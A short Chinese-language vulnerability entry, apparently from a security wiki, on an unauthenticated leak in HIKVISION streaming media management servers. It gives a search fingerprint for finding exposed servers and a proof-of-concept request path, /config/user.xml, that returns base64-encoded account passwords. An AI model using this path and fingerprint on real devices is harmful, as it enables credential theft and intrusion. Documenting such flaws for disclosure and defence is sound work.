# HIKVISION 流媒体管理服务器 user.xml 账号密码泄漏漏洞

## 漏洞描述

HIKVISION 流媒体管理服务器配置文件未做鉴权，攻击者通过漏洞可以获取网站账号密码

## 漏洞影响

<a-checkbox checked>HIKVISION 流媒体管理服务器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"杭州海康威视系统技术有限公司 版权所有"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1628165281195-23ed2181-1200-4dad-bf4a-047e382c34f4.png)

验证POC

```plain
/config/user.xml
```

![img](../../../.vuepress/public/img/1628165582265-eddb47a5-1100-40bf-9d92-4d9e9aad3dc0.png)

图中账号密码为base64加密